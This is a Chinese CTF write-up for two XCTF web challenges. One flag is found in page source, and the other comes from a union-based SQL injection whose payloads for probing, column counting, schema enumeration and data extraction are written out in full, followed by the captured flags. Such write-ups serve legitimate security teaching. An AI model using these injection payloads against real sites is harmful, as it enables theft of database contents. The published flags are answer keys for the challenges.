# Write-Up（Web部分）

## view_source

+ 打开网页，只看到一个大大的 “FLAG is not here” 的提示。
+ 题目的提示是 **查看源代码** ，因此直接在火狐浏览器中按下 **F12** ，即可看到源代码中有一行注释。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF（攻防世界）/WEB/view_source/1.png)

+ 注释中的内容就是flag。
+ flag: **cyberpeace{2d6b553891b29fd9ed11a89127bade69}**

## NewsCenter

+ 打开网页看到一个很朴素的页面，类似一个普通的新闻查询页面，页面正中间有一个搜索框：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/Hacker_News.png?raw=true)

+ 在搜索框中输入任意内容，例如输入 <code>1</code> 发现除了底下 **News** 部分显示出包含字段 <code>1</code> 的新闻以外，什么都没有发生，没有 **alert弹窗** 之类的。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/01.png?raw=true)

+ 猜测可能是 **SQL注入** ，首先尝试如下语句注入 `' and 1 = 1#` 什么都没发生...
+ 修改注入语句如下 `' and 1 = 2#` ，News部分变为空白，显然该 SQL 语句有效。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/02.png?raw=true)

+ 利用union联合注入试探该sql查询返回的列数，首先尝试 1 列 `' and 1 = 2 union select 1#` ，页面跳转显示无法访问，说明不是 1 列。

+ `' and 1 = 2 union select 1, 2#` 同样失败。

+ `' and 1 = 2 union select 1, 2, 3#` 时，News部分出现内容

  > **2**
  >
  > 3

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)

+ 于是进一步查询数据库中所有的数据表名 `' and 1 = 2 union select 1, TABLE_SCHEMA, TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` ，发现一个 **secret_table** 表：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/05.png?raw=true)

+ 查询 **secret_table** 表中的所有字段 `' and 1 = 2 union select 1, 2, COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'secret_table' #` ，发现表中字段如下：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/06.png?raw=true)

+ **fl4g** 字段非常引人注目，猜测可能其中隐藏着 **flag**，因此进一步查询 **fl4g** 的内容 `' and 1 = 2 union select 1, 2, fl4g from secret_table #`
+ 成功得到 flag 。
+ flag: **QCTF{sq1_inJec7ion_ezzz}**

